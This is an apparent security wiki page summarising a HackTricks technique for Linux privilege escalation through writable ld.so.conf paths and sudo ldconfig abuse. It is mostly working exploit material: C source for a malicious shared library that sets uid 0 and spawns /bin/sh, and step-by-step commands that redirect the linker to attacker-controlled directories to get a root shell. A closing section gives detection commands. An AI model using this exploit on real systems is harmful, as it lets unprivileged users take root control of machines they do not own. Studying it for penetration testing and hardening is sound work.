---
title: "HackTricks: ld.so Privilege Escalation Example"
tags: [linux-hardening, privilege-escalation, shared-library, ld-so]
sources: [hacktricks-ld-so-conf-example.md]
updated: 2026-05-01
---

# HackTricks: ld.so Privilege Escalation Example

Source: [hacktricks-ld-so-conf-example.md](../../raw/hacktricks-ld-so-conf-example.md)

## Key Takeaways

`/etc/ld.so.conf.d/` entries tell `ldconfig` where to find shared libraries. If any listed path is writable by an unprivileged user, they can drop a malicious `libcustom.so` that gets loaded by a SUID/root-owned binary — giving code execution as root. Separately, `sudo ldconfig` privileges allow the same attack via a crafted conf file pointing `ldconfig` at `/tmp`.

## Exploit 1 — Writable Path in ld.so.conf.d

**Condition:** `/etc/ld.so.conf.d/privesc.conf` contains a path writable by the attacker (e.g. `/home/ubuntu/lib`).

```bash
# Check for world/group-writable paths in ld.so search list
ldconfig -v 2>/dev/null | grep "^/"
cat /etc/ld.so.conf /etc/ld.so.conf.d/* 2>/dev/null
```

**Malicious library** (`/home/ubuntu/lib/libcustom.so`):

```c
// gcc -shared -o libcustom.so -fPIC libcustom.c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func() {
    setuid(0);
    setgid(0);
    system("/bin/sh");
}
```

```bash
gcc -shared -o /home/ubuntu/lib/libcustom.so -fPIC libcustom.c
# Wait for root to run ldconfig (reboot, cron, etc.)
# Then: ldd sharedvuln → shows libcustom.so loaded from /home/ubuntu/lib
./sharedvuln   # → root shell
```

If `ldconfig` has the SUID bit or is in a cron job, exploitation is immediate.

## Exploit 2 — `sudo ldconfig` Privilege

```bash
# Create fake ldconfig conf pointing to /tmp
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
mkdir -p conf
echo "/tmp" > conf/evil.conf

# Place malicious library in /tmp (compiled as above)
gcc -shared -o /tmp/libcustom.so -fPIC libcustom.c

# Execute ldconfig with fake conf
sudo ldconfig -f /tmp/fake.ld.so.conf

# Verify new load path
ldd sharedvuln   # → libcustom.so => /tmp/libcustom.so

./sharedvuln     # → root shell
```

## Additional Write Vectors

Misconfiguration can also arise from:

- Write permission on a file inside `/etc/ld.so.conf.d/`
- Write permission on the directory `/etc/ld.so.conf.d/` itself
- Write permission on `/etc/ld.so.conf`

All lead to the same outcome: attacker-controlled path enters the linker's search list.

## Detection

```bash
# Find writable ld.so conf files/paths
find /etc/ld.so.conf /etc/ld.so.conf.d -writable 2>/dev/null

# Check all listed paths for writability
ldconfig -v 2>/dev/null | grep "^/" | while read d; do
    [ -w "$d" ] && echo "WRITABLE: $d"
done
```

## Related

- [linux-privilege-escalation](../concepts/linux-privilege-escalation.md)
- [HackTricks: Write to Root](hacktricks-write-to-root.md)
- [HackTricks: Linux Privilege Escalation Checklist](hacktricks-privilege-escalation-checklist.md)
- [HackTricks](../entities/hacktricks.md)
